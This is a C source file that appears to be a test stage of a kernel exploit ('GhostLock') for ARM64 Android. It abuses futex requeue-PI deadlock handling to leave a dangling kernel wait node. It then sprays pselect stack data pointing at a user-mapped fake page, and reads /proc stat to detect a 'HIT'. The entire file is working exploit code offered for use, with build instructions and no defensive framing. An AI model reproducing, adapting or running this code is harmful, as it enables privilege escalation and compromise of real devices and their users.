/*
 * ghostlock_oracle_v2.c — GhostLock/aquaman, value oracle (1 trial proc).
 *
 * One trial per execution. Usage:
 *   ghostlock_oracle_v2 nostamp          (i) control, no stamp
 *   ghostlock_oracle_v2 stamp 0x120      (ii)/(iii) stamp + fake
 *
 * Flow: waiter locks f_chain, hangs on FWRQ (f_wait -> f_target, timeout 5s);
 * owner locks f_target and deadlocks on f_chain; main executes CMP_REQUEUE_PI
 * and requires EDEADLK (errno 35) or aborts. Reader reads /proc/<waiter>/stat f18
 * (priority = prio-100) and f19 (nice, control) BEFORE; main wakes the waiter
 * (FUPI f_target or timeout), waiter stamps and sleeps 60s alive; consumer executes
 * pthread_setschedparam(BATCH) on waiter; reader reads f18/f19 AFTER.
 * Intact: f18 20/20. Hit: f18 -100, f19 0.
 *
 * Build (NDK r29, ARM64, API 28):
 *   aarch64-linux-android28-clang -O2 -Wall -Wextra -static \
 *     ghostlock_oracle_v2.c -o ghostlock_oracle_v2
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "ghostlock_target.h"

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef __NR_gettid
#define __NR_gettid 178
#endif
#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_WAIT_REQUEUE_PI  11
#define FUTEX_CMP_REQUEUE_PI   12
#define FUTEX_PRIVATE_FLAG     128
#define EDEADLK                35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

#define NWORDS (3 * GL_PSEL_SIZE / 8)   /* 3 fd_sets of 40B = 15 u64 */

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started, o_exited;
static volatile int waiter_sys_tid;
static volatile int stamped, consumer_done, post_done;
static volatile int hb_go, hb_stop;
static volatile int f18_post, f19_post;
static volatile uint64_t g_pad;
static volatile int g_stamp_mode;
static int g_hold;
static uint64_t deep_words[NWORDS], shallow_words[NWORDS];
static void *fake_page;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

/* pselect with controlled pattern. nfds=320 => size 0x28, stays on stack. */
__attribute__((noinline)) static void psel_with(const uint64_t *w) {
    const fd_set *s0 = (const fd_set *)(w + 0);
    const fd_set *s1 = (const fd_set *)(w + 5);
    const fd_set *s2 = (const fd_set *)(w + 10);
    struct timespec ts = { 0, 0 };

    pselect(GL_PSEL_MAX_NFDS, (fd_set *)s0, (fd_set *)s1, (fd_set *)s2,
            &ts, NULL);
}

/*
 * stamp_at: VLA dimensioned by runtime pad. The compiler cannot know size
 * in prologue: emits dynamic sub sp,sp,Xn, so inner pselect runs with SP shifted by pad.
 * Touch every 64B + barrier: VLA cannot be optimized out or turned into variable memset
 * over fixed frame.
 */
__attribute__((noinline)) static void stamp_at(uint64_t pad,
                                               const uint64_t *w) {
    if (pad < 16)
        pad = 16;
    volatile unsigned char vla[pad];
    uint64_t i;

    for (i = 0; i < pad; i += 64)
        vla[i] = (unsigned char)(i & 0xff);
    vla[pad - 1] = 0xaa;
    __asm__ volatile("" :: "r"(vla) : "memory");
    psel_with(w);
    __asm__ volatile("" :: "r"(vla) : "memory");
}

/* Deep first, shallow (pad-0x78) second. SPs 0x78 apart. */
__attribute__((noinline)) static void stamp(uint64_t pad) {
    stamp_at(pad, deep_words);
    stamp_at(pad > GL_PSEL_SLOT3_OFF ? pad - GL_PSEL_SLOT3_OFF : 16,
             shallow_words);
}

/* pin CPU0: removes migration from crash window */
static void pin_cpu0(void) {
    cpu_set_t m;

    CPU_ZERO(&m);
    CPU_SET(0, &m);
    if (sched_setaffinity(0, sizeof(m), &m))
        printf("[warn] affinity errno=%d (proceeding without pin)\n", errno);
}

static void *waiter_fn(void *u) {
    (void)u;

    pin_cpu0();
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    waiter_sys_tid = (int)syscall(__NR_gettid);
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    {
        /* wakes on own TIMEOUT. main does not touch trio futexes:
         * external unlock races with timeout in same wait tree. */
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        ts.tv_sec += 2;
        w_waiting = 1;
        xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    }
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);   /* owner leaves deadlock */
    w_done = 1;
    if (g_stamp_mode)
        stamp(g_pad);
    stamped = 1;
    sleep(60);   /* kept alive for consumer; main exit terminates process */
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;

    pin_cpu0();
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0)) {
        o_exited = 1;
        return NULL;
    }
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock by design */
    o_exited = 1;
    return NULL;   /* NOT joined: kept as zombie intentionally, see main() */
}

/* heartbeat: locates crash timing. Stopped mid-settle = async crash;
 * stopped after [consumer-before] = consumer walk crash. */
static void *heartbeat_fn(void *u) {
    uint64_t t0;
    (void)u;

    pin_cpu0();
    while (!hb_go)
        usleep(10000);
    t0 = now_ns();
    while (!hb_stop) {
        printf("[hb] +%llums\n",
               (unsigned long long)((now_ns() - t0) / 1000000));
        usleep(500000);
    }
    return NULL;
}

static int read_stat(int tid, int *prio, int *nice) {
    char path[64], buf[1024], st;
    int fd, n, p = 0, v = 0;

    snprintf(path, sizeof(path), "/proc/%d/stat", tid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    buf[n] = 0;
    {
        char *rp = strrchr(buf, ')');
        if (!rp)
            return -1;
        /* f3..f19: state + 14 suppressed + priority + nice */
        if (sscanf(rp + 1, " %c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u"
                   " %*lu %*lu %*ld %*ld %d %d", &st, &p, &v) != 3)
            return -1;
    }
    *prio = p;
    *nice = v;
    return 0;
}

static void *reader_fn(void *u) {
    int spins = 0;
    (void)u;

    /* post-read only. pre-read is proven by trial 1 (f18=20 f19=0). */
    while (!consumer_done && spins++ < 900)
        usleep(10000);
    if (!consumer_done)
        return NULL;
    usleep(200000);
    if (read_stat(waiter_sys_tid, (int *)&f18_post, (int *)&f19_post) == 0)
        post_done = 1;
    return NULL;
}

static int wait_flag(volatile int *f, int secs) {
    int spins = 0;

    while (!*f && spins++ < secs * 100)
        usleep(10000);
    return *f ? 0 : -1;
}

int main(int argc, char **argv) {
    pthread_t w, o, r, hb;
    struct sched_param p = { .sched_priority = 0 };
    uint64_t t0, dt;
    int rc, spins;

    setbuf(stdout, NULL);
    pin_cpu0();
    if (argc < 2 || (strcmp(argv[1], "nostamp") &&
                     strcmp(argv[1], "stamp"))) {
        printf("usage: %s nostamp | stamp <pad_hex> [hold]\n", argv[0]);
        return 3;
    }
    g_stamp_mode = !strcmp(argv[1], "stamp");
    g_pad = (argc > 2) ? strtoull(argv[2], NULL, 0) : 0;
    /* hold anywhere after mode: nostamp hold / stamp 0x120 hold */
    g_hold = (argc > 2 && !strcmp(argv[2], "hold")) ||
             (argc > 3 && !strcmp(argv[3], "hold"));

    if (g_stamp_mode) {
        uint64_t b = (g_pad >= GL_PSELECT_SHIFT_MIN)
                         ? g_pad - GL_PSELECT_SHIFT_MIN + 0x30 : 0x30;
        size_t i;

        fake_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (fake_page == MAP_FAILED) {
            printf("[setup] mmap failed\n");
            return 3;
        }
        if (mlock(fake_page, 4096)) {
            printf("[setup] mlock failed errno=%d\n", errno);
            return 3;
        }
        memset(fake_page, 0, 4096);
        *(volatile uint32_t *)((char *)fake_page + GL_TASK_PRIO) = 0;
        for (i = 0; i < NWORDS; i++)
            deep_words[i] = shallow_words[i] = GL_PAGE_OFFSET;
        /* waiter->task falls on byte B of span; B<0x78 goes to deep */
        if (b < GL_PSEL_SPAN && !(b & 7)) {
            if (b < GL_PSEL_SLOT3_OFF)
                deep_words[b / 8] = (uint64_t)(uintptr_t)fake_page;
            else
                shallow_words[(b - GL_PSEL_SLOT3_OFF) / 8] =
                    (uint64_t)(uintptr_t)fake_page;
        }
        printf("[info] mode=stamp pad=%#llx fake=%p fake_byte=%#llx\n",
               (unsigned long long)g_pad, fake_page,
               (unsigned long long)b);
    } else {
        printf("[info] mode=nostamp (control, no stamp)\n");
    }

    f_wait = f_target = f_chain = 0;
    if (pthread_create(&w, NULL, waiter_fn, NULL) ||
        pthread_create(&o, NULL, owner_fn, NULL) ||
        pthread_create(&r, NULL, reader_fn, NULL) ||
        pthread_create(&hb, NULL, heartbeat_fn, NULL)) {
        printf("[setup] pthread_create failed\n");
        return 3;
    }

    spins = 0;
    while ((!w_waiting || !o_started) && spins++ < 1500)
        usleep(10000);
    if (!w_waiting || !o_started) {
        printf("[abort] waiter/owner failed to wait\n");
        return 2;
    }
    usleep(300000);

    errno = 0;
    xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
    if (errno != EDEADLK) {
        printf("[abort] cmp errno=%d, expected 35. no EDEADLK, no trial.\n",
               errno);
        return 2;
    }
    printf("[cmp] errno=35 EDEADLK ok, tid_waiter=%d\n", waiter_sys_tid);

    /* main unlocks nothing further: waiter wakes on timeout (2s),
     * releases chain and owner exits. */
    if (wait_flag(&w_done, 15)) {
        printf("[abort] waiter did not wake on timeout\n");
        return 2;
    }
    printf("[teardown] waiter woke and released chain\n");

    /* NO pthread_join(owner) by design.
     * Owner remains zombie: task_struct and kernel stack remain mapped,
     * and its rt_mutex_waiter node in wait tree remains valid. */
    if (wait_flag(&o_exited, 15)) {
        printf("[abort] owner did not leave deadlock\n");
        return 2;
    }
    printf("[teardown] owner became zombie (not joined), task_struct alive\n");

    if (wait_flag(&stamped, 12)) {
        printf("[abort] waiter did not stamp in time\n");
        return 2;
    }
    printf("[teardown] stamp done, settle 250ms with heartbeat\n");

    hb_go = 1;
    usleep(250000);
    printf("[teardown] settle finished\n");

    t0 = now_ns();
    errno = 0;
    printf("[consumer-before] tid=%d\n", waiter_sys_tid);
    rc = pthread_setschedparam(w, SCHED_BATCH, &p);
    dt = now_ns() - t0;
    printf("[consumer-after] rc=%d errno=%d us=%llu %s\n", rc, errno,
           (unsigned long long)dt / 1000,
           dt > 1000000ULL ? "STALL" : "fast");
    hb_stop = g_hold ? 0 : 1;
    consumer_done = 1;

    if (wait_flag(&post_done, 15)) {
        printf("[abort] reader failed to read post\n");
        return 2;
    }
    printf("[result] pad=%#llx f18_post=%d f19=%d %s survived=1\n",
           (unsigned long long)g_pad, f18_post, f19_post,
           f18_post == -100 ? "HIT" : (f18_post == 20 ? "MISS" : "ANOMALY"));

    /* hold: process never exits, so main exit_pi_state never runs. */
    if (g_hold) {
        printf("[hold] entered, process will not exit\n");
        for (;;) {
            printf("[hold] alive\n");
            usleep(500000);
        }
    }
    return 0;
}
